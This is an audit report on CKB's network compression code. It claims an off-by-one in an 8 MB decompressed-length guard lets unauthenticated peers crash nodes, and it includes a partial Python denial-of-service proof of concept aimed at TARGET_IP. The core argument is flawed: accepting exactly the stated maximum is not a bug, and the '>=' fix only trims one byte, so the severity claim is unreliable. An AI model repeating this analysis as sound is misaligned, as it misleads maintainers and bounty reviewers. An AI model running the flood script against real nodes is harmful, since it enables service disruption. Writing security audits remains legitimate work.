Audit Report

## Title
Off-by-One in Decompressed-Length Guard Allows 8 MB Heap Allocation Per P2P Message — (`network/src/compress.rs`)

## Summary
Both `LengthDelimitedCodecWithCompress::decode` and `Message::decompress` use a strict `>` comparison against `MAX_UNCOMPRESSED_LEN` (8,388,608 bytes). A payload whose `decompress_len()` equals exactly 8,388,608 passes the guard, triggering an 8 MB heap allocation before any application-layer validation. Any peer that completes the standard tentacle/secio handshake — requiring no credentials or stake — can craft such a payload cheaply and send it repeatedly, causing sustained heap pressure that can OOM-kill the node.

## Finding Description

**Root cause — off-by-one in both guards:**

`network/src/compress.rs` line 13 defines:
```rust
const MAX_UNCOMPRESSED_LEN: usize = 1 << 23; // 8MB = 8,388,608
```

`LengthDelimitedCodecWithCompress::decode` (lines 235–242):
```rust
if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN {   // 8388608 > 8388608 == false
    return Err(io::ErrorKind::InvalidData.into());
}
let mut buf = BytesMut::zeroed(decompressed_bytes_len); // allocates 8 MB
```

`Message::decompress` (lines 74–81):
```rust
if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN {   // same flaw
    ...
    Err(io::ErrorKind::InvalidData.into())
} else {
    let mut buf = vec![0; decompressed_bytes_len];   // allocates 8 MB
```

When `decompressed_bytes_len == 8,388,608`, both guards evaluate to `false` and the full 8 MB allocation proceeds.

**Decoder ignores `enable_compress`:**

The decoder branch at line 232 fires unconditionally on any frame with the compress flag byte set, with no check of `self.enable_compress`:
```rust
if (data[0] & COMPRESS_FLAG) != 0 {   // no enable_compress guard
    match decompress_len(&data[1..]) {
```
This means even protocols configured without compression will process attacker-crafted compressed frames.

**Frame-size limits do not prevent the attack:**

The largest per-protocol frame limit is RelayV3 at 4 MB. Snappy-compressing 8 MB of zero bytes produces output of a few hundred bytes — orders of magnitude below every protocol's `max_frame_length`. The compressed payload fits trivially within any channel's frame budget.

**Exploit flow:**
1. Attacker opens a TCP connection to the node's P2P port and completes the standard tentacle/secio handshake (no credentials required).
2. Attacker crafts a snappy-compressed frame whose embedded length header encodes exactly 8,388,608 bytes (e.g., snappy-compress 8 MB of zeros).
3. Node receives the frame, calls `decompress_len`, gets 8,388,608, evaluates `8388608 > 8388608 == false`, and calls `BytesMut::zeroed(8388608)`.
4. If the decompressed content is valid snappy data (it is — zeros compress/decompress cleanly), the connection is not dropped and the attacker can repeat indefinitely.
5. With 125 simultaneous peers each sending one such message, the node faces ~1 GB of concurrent heap pressure; at the service ceiling of 1,024 peers, ~8 GB.

## Impact Explanation

This vulnerability can crash a CKB node through OOM. The heap pressure is concrete and repeatable: each message forces an 8 MB allocation, the connection is not dropped on success, and the attacker can sustain the load from many concurrent connections. This matches the allowed bounty impact: **High (10,001–15,000 points) — Vulnerabilities which could easily crash a CKB node.**

## Likelihood Explanation

The attack requires only a standard P2P TCP connection — no authentication, no stake, no PoW. The crafted payload is trivial to produce (snappy-compress 8 MB of zeros). The off-by-one exists identically in both code paths and has no compensating runtime control. Any adversary who can reach the node's P2P port can execute this with a small script.

## Recommendation

Change both guards from strict `>` to `>=`:

```rust
// network/src/compress.rs, line 235
if decompressed_bytes_len >= MAX_UNCOMPRESSED_LEN {

// network/src/compress.rs, line 74
if decompressed_bytes_len >= MAX_UNCOMPRESSED_LEN {
```

Additionally:
- Gate the decoder's compressed-frame branch on `self.enable_compress` to prevent unauthenticated decompression on protocols that do not negotiate compression.
- Consider per-peer rate limiting on decompression and a node-wide cap on total concurrent decompression memory.

## Proof of Concept

```python
import snappy, struct, socket

# 1. Craft payload: exactly MAX_UNCOMPRESSED_LEN bytes of zeros, snappy-compressed
raw = b'\x00' * 8388608           # exactly 1 << 23
compressed = snappy.compress(raw)  # produces ~few hundred bytes

# 2. Build frame: [4-byte big-endian length][0x80 compress flag][compressed payload]
payload = b'\x80' + compressed
frame = struct.pack('>I', len(payload)) + payload

# 3. Connect, complete tentacle/secio handshake, send frame
s = socket.create_connection(('TARGET_IP', 8115))
# ... complete handshake ...
s.sendall(frame)
# Node evaluates: 8388608 > 8388608 == false → BytesMut::zeroed(8388608) called

# 4. Repeat from 125 concurrent connections → ~1 GB simultaneous heap pressure
```

Unit test plan: add a test in `network/src/compress.rs` that constructs a snappy frame with `decompress_len` returning exactly `MAX_UNCOMPRESSED_LEN`, calls `LengthDelimitedCodecWithCompress::decode`, and asserts it returns `Err(InvalidData)` — this test currently fails, confirming the bug.
